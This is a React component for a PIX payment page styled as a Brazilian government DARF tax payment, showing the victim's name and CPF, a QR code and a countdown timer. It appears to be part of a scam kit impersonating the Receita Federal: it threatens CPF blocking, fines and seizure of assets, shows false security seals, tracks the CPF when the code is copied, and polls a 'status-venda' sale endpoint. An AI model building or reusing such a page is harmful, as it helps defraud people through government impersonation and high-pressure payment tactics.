import { useState, useEffect, useRef } from "react";
import { QRCodeSVG } from "qrcode.react";
import { Copy, CheckCircle, Clock, Shield, QrCode, ArrowLeft, AlertTriangle, Smartphone, Lock, Landmark } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useTracking } from "@/hooks/useTracking";
import GovHeader from "./GovHeader";
import GovFooter from "./GovFooter";

interface PixPaymentScreenProps {
  nome: string;
  cpf: string;
  valor: number;
  pixCopiaCola: string;
  transactionId: string;
  onBack: () => void;
  onPaid: () => void;
  onTabChange?: (tab: "inicio" | "consultas" | "seguranca" | "ajuda") => void;
}

const formatCurrency = (value: number) =>
  value.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const formatCpf = (cpf: string) =>
  `${cpf.slice(0, 3)}.${cpf.slice(3, 6)}.${cpf.slice(6, 9)}-${cpf.slice(9)}`;

const PixPaymentScreen = ({ nome, cpf, valor, pixCopiaCola, transactionId, onBack, onPaid, onTabChange }: PixPaymentScreenProps) => {
  const [copied, setCopied] = useState(false);
  const [timeLeft, setTimeLeft] = useState(30 * 60);
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const { trackEvent } = useTracking();

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((t) => (t > 0 ? t - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Poll payment status every 5 seconds
  useEffect(() => {
    if (!transactionId) return;

    const checkStatus = async () => {
      try {
        const res = await supabase.functions.invoke("api-proxy", {
          body: { endpoint: "/status-venda", transactionId },
        });
        if (res.data?.success && res.data?.status === "PAID") {
          if (pollingRef.current) clearInterval(pollingRef.current);
          onPaid();
        }
      } catch {
        // silently retry
      }
    };

    checkStatus();
    pollingRef.current = setInterval(checkStatus, 5000);

    return () => {
      if (pollingRef.current) clearInterval(pollingRef.current);
    };
  }, [transactionId, onPaid]);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(pixCopiaCola);
    } catch {
      const textarea = document.createElement("textarea");
      textarea.value = pixCopiaCola;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);
    }
    setCopied(true);
    trackEvent("pix_copied", cpf, { valor, transactionId });
    setTimeout(() => setCopied(false), 3000);
  };

  const minutes = Math.floor(timeLeft / 60);
  const seconds = timeLeft % 60;

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <GovHeader nome={nome} cpf={cpf} />

      {/* Title bar */}
      <div className="w-full gradient-primary py-2 sm:py-3">
        <div className="mx-auto max-w-3xl px-4 flex items-center justify-between">
          <div className="flex items-center gap-1.5 sm:gap-2">
            <QrCode className="h-3.5 w-3.5 sm:h-4 sm:w-4 text-primary-foreground" />
            <span className="text-xs sm:text-sm font-bold text-primary-foreground tracking-wide">
              Pagamento via PIX - DARF
            </span>
          </div>
          <div className="flex items-center gap-1 text-[9px] sm:text-[10px] text-primary-foreground/60">
            <Lock className="h-2.5 sm:h-3 w-2.5 sm:w-3" />
            <span>Transação segura</span>
          </div>
        </div>
      </div>

      <div className="mx-auto max-w-lg w-full px-4 py-5 sm:py-8 animate-fade-in-up flex-1">
        {/* Status */}
        <div className="text-center mb-4 sm:mb-6">
          <div className="mx-auto mb-2 sm:mb-3 flex h-12 w-12 sm:h-14 sm:w-14 items-center justify-center rounded-2xl bg-accent/10">
            <CheckCircle className="h-6 w-6 sm:h-7 sm:w-7 text-accent" />
          </div>
          <h1 className="text-lg sm:text-xl font-extrabold text-foreground">DARF Gerado com Sucesso</h1>
          <p className="text-xs sm:text-sm text-muted-foreground mt-1">Efetue o pagamento via PIX para regularizar</p>
        </div>

        {/* Warning - top */}
        <div className="mb-4 sm:mb-6">
          <div className="rounded-lg sm:rounded-xl border-2 border-destructive/40 bg-destructive/5 p-3 sm:p-4">
            <div className="flex items-start gap-2 sm:gap-3 mb-2">
              <AlertTriangle className="h-4 w-4 sm:h-5 sm:w-5 text-destructive shrink-0 mt-0.5 animate-pulse" />
              <p className="text-xs sm:text-sm font-bold text-destructive">
                ATENÇÃO: Consequências do não pagamento
              </p>
            </div>
            <ul className="space-y-1.5 sm:space-y-2 ml-6 sm:ml-8 text-[10px] sm:text-xs text-muted-foreground">
              <li className="flex items-start gap-1.5">
                <span className="text-destructive font-bold">•</span>
                <span>Multa de <strong className="text-foreground">20%</strong> sobre o valor total + juros SELIC acumulados</span>
              </li>
              <li className="flex items-start gap-1.5">
                <span className="text-destructive font-bold">•</span>
                <span>Inscrição em <strong className="text-foreground">Dívida Ativa da União</strong></span>
              </li>
              <li className="flex items-start gap-1.5">
                <span className="text-destructive font-bold">•</span>
                <span><strong className="text-foreground">Bloqueio do CPF</strong> junto à Receita Federal</span>
              </li>
              <li className="flex items-start gap-1.5">
                <span className="text-destructive font-bold">•</span>
                <span>Impedimento de emissão de <strong className="text-foreground">certidões negativas</strong> e participação em concursos</span>
              </li>
              <li className="flex items-start gap-1.5">
                <span className="text-destructive font-bold">•</span>
                <span>Possibilidade de <strong className="text-foreground">penhora de bens</strong> e execução fiscal</span>
              </li>
            </ul>
            <p className="mt-2 sm:mt-3 ml-6 sm:ml-8 text-[10px] sm:text-xs text-destructive font-semibold italic">
              Regularize agora e evite complicações futuras.
            </p>
          </div>
        </div>

        {/* Payment Card */}
        <div className="rounded-xl sm:rounded-2xl border border-border bg-card shadow-lg overflow-hidden">
          {/* Value header */}
          <div className="gov-header p-4 sm:p-6 text-center">
            <p className="text-[9px] sm:text-[10px] text-white/50 uppercase tracking-wider mb-1">Valor Total a Pagar</p>
            <p className="text-2xl sm:text-3xl font-extrabold text-white tabular-nums">{formatCurrency(valor)}</p>
            <div className="mt-1.5 sm:mt-2 flex items-center justify-center gap-2 sm:gap-4 text-[9px] sm:text-[10px] text-white/40 flex-wrap">
              <span>CPF: {formatCpf(cpf)}</span>
              <span className="hidden sm:inline">•</span>
              <span className="hidden sm:inline">{nome}</span>
            </div>
          </div>

          {/* Timer */}
          <div className="flex items-center justify-center gap-1.5 sm:gap-2 py-2 sm:py-3 bg-destructive/5 border-b border-border">
            <Clock className="h-3.5 w-3.5 sm:h-4 sm:w-4 text-destructive animate-pulse" />
            <span className="text-xs sm:text-sm font-bold text-destructive tabular-nums">
              Expira em: {String(minutes).padStart(2, "0")}:{String(seconds).padStart(2, "0")}
            </span>
          </div>

          <div className="p-4 sm:p-6 space-y-4 sm:space-y-5">
            {/* QR Code */}
            <div className="text-center">
              <p className="text-[10px] sm:text-xs font-bold text-muted-foreground uppercase tracking-wider mb-2 sm:mb-3">
                Escaneie o QR Code
              </p>
              <div className="inline-flex rounded-xl sm:rounded-2xl border-2 border-primary/20 bg-white p-3 sm:p-4 shadow-sm">
                <QRCodeSVG
                  value={pixCopiaCola}
                  size={160}
                  level="M"
                  includeMargin={false}
                  bgColor="#ffffff"
                  fgColor="#1a1a2e"
                  className="w-[140px] h-[140px] sm:w-[200px] sm:h-[200px]"
                />
              </div>
              <p className="text-[9px] sm:text-[10px] text-muted-foreground mt-1.5 sm:mt-2">
                Aponte a câmera do seu banco para o código acima
              </p>
            </div>

            {/* Divider */}
            <div className="flex items-center gap-2 sm:gap-3">
              <div className="flex-1 border-t border-border" />
              <span className="text-[9px] sm:text-[10px] font-bold text-muted-foreground uppercase tracking-wider">ou copie o código</span>
              <div className="flex-1 border-t border-border" />
            </div>

            {/* PIX Copia e Cola */}
            <div>
              <p className="text-[10px] sm:text-xs font-bold text-muted-foreground uppercase tracking-wider mb-1.5 sm:mb-2">
                PIX Copia e Cola
              </p>
              <div className="rounded-lg sm:rounded-xl border-2 border-dashed border-primary/30 bg-primary/5 p-3 sm:p-4 max-h-20 sm:max-h-24 overflow-y-auto">
                <p className="text-[10px] sm:text-[11px] text-foreground font-mono break-all leading-relaxed select-all">
                  {pixCopiaCola}
                </p>
              </div>
            </div>

            {/* Copy Button */}
            <button
              onClick={handleCopy}
              className={`w-full rounded-xl sm:rounded-2xl py-3.5 sm:py-4 text-sm sm:text-base font-bold transition-all flex items-center justify-center gap-2 shadow-lg active:scale-[0.98] ${
                copied
                  ? "bg-accent text-accent-foreground"
                  : "gradient-accent text-accent-foreground hover:opacity-90 hover:shadow-xl"
              }`}
            >
              {copied ? (
                <>
                  <CheckCircle className="h-4 w-4 sm:h-5 sm:w-5" />
                  CÓDIGO COPIADO!
                </>
              ) : (
                <>
                  <Copy className="h-4 w-4 sm:h-5 sm:w-5" />
                  COPIAR CÓDIGO PIX
                </>
              )}
            </button>
          </div>

          {/* Instructions */}
          <div className="mx-4 sm:mx-6 mb-4 sm:mb-5">
            <div className="rounded-lg sm:rounded-xl border border-border bg-muted/30 p-3 sm:p-4">
              <div className="flex items-center gap-1.5 sm:gap-2 mb-2 sm:mb-3">
                <Smartphone className="h-3.5 w-3.5 sm:h-4 sm:w-4 text-primary" />
                <p className="text-[11px] sm:text-xs font-bold text-foreground">Como pagar:</p>
              </div>
              <ol className="space-y-1.5 sm:space-y-2 text-[11px] sm:text-xs text-muted-foreground">
                {[
                  "Abra o aplicativo do seu banco",
                  <>Escolha <strong className="text-foreground">Pagar com PIX</strong></>,
                  "Escaneie o QR Code ou cole o código",
                  "Confirme o pagamento",
                ].map((text, i) => (
                  <li key={i} className="flex items-start gap-1.5 sm:gap-2">
                    <span className="flex h-4 w-4 sm:h-5 sm:w-5 shrink-0 items-center justify-center rounded-full bg-primary/10 text-[9px] sm:text-[10px] font-bold text-primary">{i + 1}</span>
                    {text}
                  </li>
                ))}
              </ol>
            </div>
          </div>

          {/* Security footer */}
          <div className="px-4 sm:px-6 pb-4 sm:pb-6">
            <div className="rounded-lg sm:rounded-xl bg-muted/30 border border-border p-2.5 sm:p-3 flex items-center justify-center gap-3 sm:gap-4 text-[9px] sm:text-[10px] text-muted-foreground flex-wrap">
              <div className="flex items-center gap-1">
                <Landmark className="h-2.5 sm:h-3 w-2.5 sm:w-3 text-accent" />
                <span>Banco Central do Brasil</span>
              </div>
              <span>•</span>
              <div className="flex items-center gap-1">
                <Shield className="h-2.5 sm:h-3 w-2.5 sm:w-3 text-accent" />
                <span>Criptografia AES-256</span>
              </div>
              <span className="hidden sm:inline">•</span>
              <div className="hidden sm:flex items-center gap-1">
                <Lock className="h-3 w-3 text-accent" />
                <span>SSL/TLS 1.3</span>
              </div>
            </div>
          </div>
        </div>

        <button
          onClick={onBack}
          className="mt-3 sm:mt-4 w-full flex items-center justify-center gap-2 text-xs sm:text-sm text-muted-foreground hover:text-foreground transition-colors"
        >
          <ArrowLeft className="h-3.5 w-3.5 sm:h-4 sm:w-4" />
          Voltar
        </button>
      </div>
      <GovFooter onTabChange={onTabChange} />
    </div>
  );
};

export default PixPaymentScreen;
